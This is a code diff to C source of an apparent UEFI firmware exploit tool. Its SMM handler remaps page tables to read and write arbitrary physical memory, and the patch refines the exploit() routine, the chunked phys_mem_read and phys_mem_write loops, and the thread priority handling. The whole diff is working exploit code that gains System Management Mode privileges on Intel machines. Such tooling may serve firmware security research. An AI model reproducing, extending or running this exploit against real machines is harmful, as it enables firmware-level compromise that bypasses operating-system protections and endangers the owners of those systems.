@@ -162,9 +162,13 @@ static void smm_handler(void *context)
 
                             // set new PFN to map target physical page to virtual address space at 0x1000000
                             PD_entry->Bits.PageTableBaseAddress = PAGE_TO_PFN(new_addr);
-                                                        
+                            
                             // flush TLB
                             _invlpg(addr);
+
+                            // we can do memory reads or writes only within one 2 Mb virtual page
+                            handler_context->phys_mem.size = 
+                                min(handler_context->phys_mem.size, PAGE_SIZE_2MB - offset);                            
 
                             if (handler_context->op == SMM_OP_PHYS_PAGE_READ)
                             {
@@ -172,7 +176,7 @@ static void smm_handler(void *context)
                                 memcpy(
                                     &handler_context->phys_mem.data, 
                                     (unsigned char *)addr + offset,
-                                    min(handler_context->phys_mem.size, PAGE_SIZE_2MB - offset)
+                                    handler_context->phys_mem.size
                                 );
                             }
                             else
@@ -181,16 +185,17 @@ static void smm_handler(void *context)
                                 memcpy(
                                     (unsigned char *)addr + offset,
                                     &handler_context->phys_mem.data,
-                                    min(handler_context->phys_mem.size, PAGE_SIZE_2MB - offset)
+                                    handler_context->phys_mem.size
                                 );
                             }
                             
                             // restore old PFN
-                            PD_entry->Bits.PageTableBaseAddress = old_pfn;
-                            status = 0;
+                            PD_entry->Bits.PageTableBaseAddress = old_pfn;                            
 
                             // flush TLB
                             _invlpg(addr);
+
+                            status = 0;
                         }
                         else
                         {
@@ -444,6 +449,17 @@ int exploit(int target, PUEFI_EXPL_TARGET custom_target, PSMM_HANDLER_CONTEXT co
 
     context->status = -1;    
 
+#ifdef WIN32
+
+    SetThreadAffinityMask(GetCurrentThread(), 1);
+    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
+
+#else
+
+    // ...
+
+#endif
+
     // copy SMM_HANDLER_CONTEXT to continious physical memory buffer
     if (uefi_expl_mem_alloc(context_size, &addr, &phys_addr))
     {
@@ -482,6 +498,16 @@ int exploit(int target, PUEFI_EXPL_TARGET custom_target, PSMM_HANDLER_CONTEXT co
         printf("ERROR: uefi_expl_mem_alloc() fails\n");
     }
 
+#ifdef WIN32
+
+    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
+
+#else
+
+    // ...
+
+#endif
+
     return ret;
 }
 //--------------------------------------------------------------------------------------
@@ -493,7 +519,7 @@ int phys_mem_read(
     int ret = -1;
     int chunk_size = MEM_IO_BUFF_LEN;
     unsigned int context_size = XALIGN_UP(sizeof(SMM_HANDLER_CONTEXT) + chunk_size, PAGE_SIZE);
-    unsigned long long total = 0;
+    unsigned long long total = 0, p = 0;
 
     PSMM_HANDLER_CONTEXT context = (PSMM_HANDLER_CONTEXT)malloc(context_size);
     if (context == NULL)
@@ -516,7 +542,7 @@ int phys_mem_read(
     memset(context, 0, context_size);
     context->op = SMM_OP_PHYS_PAGE_READ;
 
-    for (unsigned long long p = 0; p < size; p += chunk_size)
+    while (p < size)
     {
         unsigned int data_size = min(chunk_size, size - p);
     
@@ -529,6 +555,8 @@ int phys_mem_read(
             printf("ERROR: exploit() fails\n");
             goto _end;
         }
+
+        data_size = context->phys_mem.size;
 
         if (data)
         {
@@ -552,6 +580,7 @@ int phys_mem_read(
             hexdump(context->phys_mem.data, data_size, (unsigned long long)addr + p);
         }
 
+        p += data_size;
         total += data_size;
     }
 
@@ -582,7 +611,7 @@ int phys_mem_write(
     int ret = -1;
     int chunk_size = MEM_IO_BUFF_LEN;
     unsigned int context_size = XALIGN_UP(sizeof(SMM_HANDLER_CONTEXT) + chunk_size, PAGE_SIZE);
-    unsigned long long total = 0;
+    unsigned long long total = 0, p = 0;
 
     if (data == NULL && file_path == NULL)
     {
@@ -636,7 +665,7 @@ int phys_mem_write(
     memset(context, 0, context_size);
     context->op = SMM_OP_PHYS_PAGE_WRITE;
 
-    for (unsigned long long p = 0; p < size; p += chunk_size)
+    while (p < size)
     {
         unsigned int data_size = min(chunk_size, size - p);
 
@@ -645,6 +674,12 @@ int phys_mem_write(
 
         if (file_path)
         {
+            if (fseek(f, p, SEEK_SET) != 0)
+            {
+                printf("ERROR: fseek() fails\n");
+                goto _end;
+            }
+
             // read data from file
             if (fread(context->phys_mem.data, 1, data_size, f) != data_size)
             {
@@ -665,6 +700,9 @@ int phys_mem_write(
             goto _end;
         }
 
+        data_size = context->phys_mem.size;
+
+        p += data_size;
         total += data_size;
     }
 
@@ -1097,14 +1135,7 @@ int _tmain(int argc, _TCHAR* argv[])
             
             // check for Intel VID
             if (vid == 0x8086)
-            {            
-
-#ifdef WIN32
-                SetThreadAffinityMask(GetCurrentThread(), 1);
-                SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);                                
-#else
-                // ...
-#endif
+            {
                 if (mem_read)
                 {
                     // read memory contents
@@ -1145,11 +1176,6 @@ int _tmain(int argc, _TCHAR* argv[])
                         ret = exploit(target, &custom_target, &context, 0, false);
                     }
                 }
-#ifdef WIN32
-                SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
-#else
-                // ...
-#endif
             }
             else
             {
